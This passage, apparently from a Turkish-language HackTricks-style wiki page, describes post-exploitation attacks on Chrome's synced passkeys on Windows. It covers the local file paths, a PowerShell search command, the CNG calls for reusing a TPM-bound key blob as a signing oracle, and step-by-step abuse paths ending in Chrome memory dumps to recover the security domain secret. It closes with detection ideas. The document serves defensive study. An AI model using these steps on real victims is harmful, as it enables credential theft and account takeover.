**Google Password Manager ile senkronize edilmiş passkeys** kullanan bir Windows ana bilgisayarında **kurban kullanıcısı** olarak kod yürütme elde edilirse, admin/SYSTEM olmadan bile passkeys, istismar sonrası için ilgi çekici bir hedef hâline gelir.<sup>[[4]](#references)</sup>

### İlgi çekici yerel buluntular

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`**, protobuf ile kodlanmış **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir süreç, senkronize edilmiş passkey'ler için **RP ID**, **kullanıcı adı**, **kimlik bilgisi ID'si** ve şifrelenmiş özel anahtar materyalini listeleyebilir.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** gibi yerel cihaz kaydı durumunu ve senkronize edilmiş kimlik bilgilerini kurtarmak için kullanılan sarılmış gizli anahtarı depolar.<sup>[[4]](#references)</sup>

Hızlı triyaj:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM'e bağlı anahtar blob'ları yerel imzalama oracle'ı olarak hâlâ kötüye kullanılabilir

Tarayıcı, TPM destekli bir kimlik anahtarını **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcının erişebildiği bir konumda saklarsa, malware'in ham özel anahtarı çıkarması **gerekmez**. Blob'u **aynı makinede** yeniden içe aktarabilir ve yerel TPM'den saldırganın kontrolündeki verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Bu, **hardware binding'in cihaz dışına aktarımı engellediği ancak güvenliği ihlal edilmiş uç noktada aynı kullanıcı tarafından kullanılmasını engellemediği** anlamına gelir.

### Pratik kötüye kullanım yolları

1. **Pass-the-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` kayıtlarını listeleyin.
   - Bir passkey login başlatın ve yeni bir WebAuthn challenge alın.
   - Cloud-authenticator request binding'i imzalamak için çalınan `wrapped_identity_private_key` blob'unu kurbanın TPM'inde kullanın.
   - Döndürülen assertion'ı relying party'ye relay edin.
   - Bu yöntem özellikle RP'nin `userVerification=preferred` değerini kabul ettiği veya **`UV=0`** olan assertion'ları reddetmediği durumlarda değerlidir.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` dosyasını silerek veya geçerli bir imzalı `device/forget` işlemi göndererek yeniden onboarding yapılmasını zorlayın.
   - Onboarding cihazı **`uv_key_pending`** durumunda bırakırsa, saldırganın kontrolündeki bir UV public key kaydedin.
   - Provider yeni UV key için attestation / secure-hardware origin doğrulaması yapmazsa, saldırganın key'iyle atılan sonraki imzalar **`UV=1`** olarak değerlendirilir.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - Chrome'un synced-passkey master secret'ını alması için recovery veya yeniden katılımı zorlayın.
   - `passkey_enclave_state` dosyasının yeniden oluşturulmasını/değiştirilmesini izleyin, ardından plaintext **security domain secret (SDS)** bellekte bulunduğu sırada Chrome belleğini dump edin.
   - Kurtarılan SDS'yi kullanarak her `WebauthnCredentialSpecifics` kaydındaki şifrelenmiş alanların şifresini çözün ve taşınabilir WebAuthn private key'leri kurtarın.

### DFIR / tespit fikirleri

- `passkey_enclave_state` dosyasının **silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
- Tarayıcı dışı süreçlerin Chrome **`Sync Data\LevelDB`** alanına anormal erişimi için alarm oluşturun.
- **Chrome memory dump** işlemleri veya şüpheli süreçler arası bellek erişimi için alarm oluşturun.
- Tekrarlanan **Google Password Manager recovery PIN** istemlerini veya beklenmedik yeniden onboarding işlemlerini araştırın.
- WebAuthn **`signCount`** değerinin synced passkey'lerde çoğu zaman yararlı olmadığını ve sabit kalabileceğini unutmayın; bu nedenle klasik clone detection zayıftır.

## References

- [1] [Unit 42 – Yüksek Değerli Sektörleri Hedef Alan Yıllarca Tespit Edilmemiş Operasyonlara İlişkin Bir İnceleme](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi şifre çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon'ın İç Yüzü: Gizli Bir Saldırı Operasyonunun Relay Ağı ve İşleyişi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Passwordless Authentication'da Yeni Bir Saldırı Yüzeyi](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows Hacking: Microsoft Sistemlerine ve Ağlarına Saldırılar](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store'un Gerçek İşleyişi: NTDS.dit'in İç Yüzü (Bölüm 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho, Still Toolkit ile Siber Casusluk Araç Setini Genişletiyor](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW işlevi ve `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – etkin oturumları sonlandırma](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard ve Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Kimlik Bilgilerinin Korunması ve Yönetimi](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
{{#include ../../banners/hacktricks-training.md}}
